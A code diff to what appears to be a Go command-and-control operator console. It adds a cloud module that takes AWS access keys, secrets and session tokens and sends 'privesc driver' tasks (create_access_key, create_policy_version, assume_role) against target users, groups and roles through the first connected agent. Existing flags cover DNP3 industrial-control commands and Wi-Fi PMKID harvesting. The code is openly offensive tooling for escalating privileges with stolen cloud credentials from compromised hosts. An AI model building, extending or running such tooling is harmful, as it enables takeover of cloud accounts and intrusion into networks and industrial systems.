@@ -94,6 +94,18 @@ func main() {
 	icsDest := flag.Uint("ics-dest", 1, "dnp3 outstation address")
 	icsSrc := flag.Uint("ics-src", 100, "dnp3 master address")
 	icsClass := flag.Uint("ics-class", 0, "dnp3 class 0..3")
+	cloudAction := flag.String("cloud", "", "cloud action: probe|chain|identity|users|roles|simulate|driver")
+	cloudProvider := flag.String("cloud-provider", "aws", "cloud provider: aws|gcp|azure (for probe)")
+	cloudKey := flag.String("cloud-key", "", "aws access key id")
+	cloudSecret := flag.String("cloud-secret", "", "aws secret access key")
+	cloudToken := flag.String("cloud-token", "", "aws session token")
+	cloudRegion := flag.String("cloud-region", "us-east-1", "aws region")
+	cloudArn := flag.String("cloud-arn", "", "policy source arn (for simulate)")
+	cloudDriver := flag.String("cloud-driver", "", "privesc driver: create_access_key|create_policy_version|...")
+	cloudUser := flag.String("cloud-user", "", "target user (driver)")
+	cloudGroup := flag.String("cloud-group", "", "target group (driver)")
+	cloudPolicyArn := flag.String("cloud-policy-arn", "", "policy arn (driver)")
+	cloudRoleArn := flag.String("cloud-role-arn", "", "role arn (assume_role)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -356,6 +368,24 @@ func main() {
 			Dest:   uint16(*icsDest),
 			Src:    uint16(*icsSrc),
 			Class:  uint8(*icsClass),
+		})
+	}
+
+	// cloud dispatch — cloud-provider ops via the first agent
+	if *cloudAction != "" {
+		go runCloudDispatch(mgr, cloudArgs{
+			Action:    *cloudAction,
+			Provider:  *cloudProvider,
+			KeyID:     *cloudKey,
+			Secret:    *cloudSecret,
+			Token:     *cloudToken,
+			Region:    *cloudRegion,
+			Arn:       *cloudArn,
+			Driver:    *cloudDriver,
+			User:      *cloudUser,
+			Group:     *cloudGroup,
+			PolicyArn: *cloudPolicyArn,
+			RoleArn:   *cloudRoleArn,
 		})
 	}
 
@@ -880,4 +910,50 @@ func hexDecode(s string) ([]byte, error) {
 		out[i] = byte(b)
 	}
 	return out, nil
+}
+
+// cloudArgs carries the operator's -cloud* flags.
+type cloudArgs struct {
+	Action    string
+	Provider  string
+	KeyID     string
+	Secret    string
+	Token     string
+	Region    string
+	Arn       string
+	Driver    string
+	User      string
+	Group     string
+	PolicyArn string
+	RoleArn   string
+}
+
+// runCloudDispatch waits for the first agent, fires a CloudStart.
+func runCloudDispatch(mgr *session.Manager, a cloudArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("cl-%d", time.Now().UnixNano())
+
+	log.Printf("[cloud] %s/%s -> %s", a.Action, a.Provider, s.AgentID)
+
+	req := proto.CloudStart{
+		SessionID:       sessionID,
+		Action:          a.Action,
+		Cloud:           a.Provider,
+		AccessKeyID:     a.KeyID,
+		SecretAccessKey: a.Secret,
+		SessionToken:    a.Token,
+		Region:          a.Region,
+		PolicySourceArn: a.Arn,
+		Driver:          a.Driver,
+		TargetUser:      a.User,
+		TargetGroup:     a.Group,
+		PolicyARN:       a.PolicyArn,
+		RoleARN:         a.RoleArn,
+	}
+	if err := s.SendCloudStart(sessionID, req); err != nil {
+		log.Printf("[cloud] start: %v", err)
+	}
 }
